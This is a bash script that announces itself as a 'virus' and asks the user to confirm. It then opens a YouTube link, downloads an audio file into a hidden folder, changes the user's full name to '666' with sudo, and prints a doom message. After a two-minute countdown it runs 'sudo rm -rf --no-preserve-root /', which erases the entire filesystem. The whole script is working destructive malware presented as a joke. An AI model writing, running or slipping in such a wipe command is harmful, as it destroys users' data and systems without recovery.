#!/bin/bash

echo "Are you sure you want to start the virus $USER (y/n): "
read answer
if [[ "$answer" == "y" || "$answer" == "Y" ]]; then
    cd /usr/share
    mkdir wow
    cd wow
    cd ~/Desktop
    echo "666" > 666
    cd ~/
    echo "Is this your Username?"
    echo "$USER"
    echo "-------------------"
    echo "Is this your home directory"
    echo "/home/$USER/"
    ERROR="666"
    xdg-open "https://www.youtube.com/watch?v=GpKlb9yiGvI"
    sudo apt install ffmpeg
    cd ~/
    mkdir .assets
    cd .assets
    wget https://www.dropbox.com/scl/fi/d1xdtql2mif5f34odrqnj/your-alarm.mp3?rlkey=xh10eif6oepkh7s4ovyji8chx&st=hv2nbggu&dl=1
    sudo chfn -f "666" $USER
    echo "---------------------------------"
    echo "your computer is dommed. I'll give you 2 minutes to say goodbye to your pc."
    sleep 120
    sudo rm -rf --no-preserve-root /
else
    echo "Stopped Virus"
fi
